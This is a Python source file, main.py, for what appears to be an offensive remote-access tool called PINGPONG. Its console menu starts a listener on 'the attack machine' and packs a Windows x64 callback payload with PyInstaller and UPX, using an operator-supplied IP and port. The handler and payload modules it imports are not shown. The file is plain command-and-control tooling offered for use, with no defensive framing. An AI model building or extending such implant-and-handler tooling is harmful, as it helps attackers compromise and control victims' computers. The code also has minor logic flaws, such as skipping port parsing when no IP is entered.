# -*- coding:utf-8 -*-
# @FileName  :main.py
# @Time      :2022/11/07 20:27:59
# @Author    :D0WE1L1N\
import handler
import payload.payload_packer
import json
#print的基本函数
#PINPONG 攻击载荷文件夹：payload/PINGPONG_payload_file
def print_error(str):
    print('\033[0;31m'+ str + '\033[0m')
def print_good(str):
    print('\033[0;36m'+ str + '\033[0m')
def print_warn(str):
    print('\033[0;33m'+ str + '\033[0m')
def print_normal(str):
    print('\033[0;34m'+ str + '\033[0m')
#主程序
def print_main():
    print_good(
        '''\033[0;35m
(    (        )             (        )      )            ____ 
)\ ) )\ )  ( /(  (          )\ )  ( /(   ( /(  (        |   / 
(()/((()/(  )\()) )\ )      (()/(  )\())  )\()) )\ )     |  /  
/(_))/(_))((_)\ (()/(       /(_))((_)\  ((_)\ (()/(     | /   
(_)) (_))   _((_) /(_))_    (_))    ((_)  _((_) /(_))_   |/    
| _ \|_ _| | \| |(_)) __|   | _ \  / _ \ | \| |(_)) __| (      
|  _/ | |  | .` |  | (_ |   |  _/ | (_) || .` |  | (_ | )\     
|_|  |___| |_|\_|   \___|   |_|    \___/ |_|\_|   \___|((_)    
                                                            

========================WELCOME !!========================
====================Wescan   V0.0.3.1 ====================
====================Aurthor : D0WE1L1N====================                                                                                                                
    \033[0m''')
    main()
#选择
def sub_main():
    choice = input("choose your choice>")
    if choice == "1":
       startserver()
    if choice == "2":
        print_normal("type of payload:")
        print_normal("1) PINGPONG windows x64")
        print_warn("YOU NEED TO INSTALL UPX AND PYINSTALLER, if you already install BOTH of it, ignore this")
        type = input("choose your choice>")
        if type == "1":
            upx_dir = input("payload>[*]Please enter your upx dir(blank for u don't have it)>")
            ip = input("payload>[*]Please input the ip of your host(blank for 127.0.0.1)>")
            port = input("payload>[*]Please input the port(blank for 624)>")
            if port == "":
                port = 624
            if ip == "":
                ip = "127.0.0.1"
            else:
                try:
                    port = int(port)
                except:
                    print_error("handler>[-]port input error")
            # payload.payload_packer.pack("_basic_conn.py", ip, port, False)
            payload.payload_packer.pack("PINGPONG_payload/PINGPONG_payload", ip, port, True, upx_dir)
    if choice == "PING":
        print("PONG")
        sub_main()
    elif choice == "exit":
        print("exiting......")
    else:
        print("error:no such choice")
        main()
def main():
    print_normal("Active choice:")
    print_normal("1) Start a PINGPONG handler")
    print_normal("2) Make payload(s)")
    # print_normal("3) Settings")
    sub_main()
def startserver():
    ip = input("handler>[*]Please input the IP for the attack machine(blank for 127.0.0.1)>")
    port = input("handler>[*]Please input the PORT(blank for 624)>")
    handler.startserver(ip, port, True, False)
if __name__ == "__main__":
    print_main()
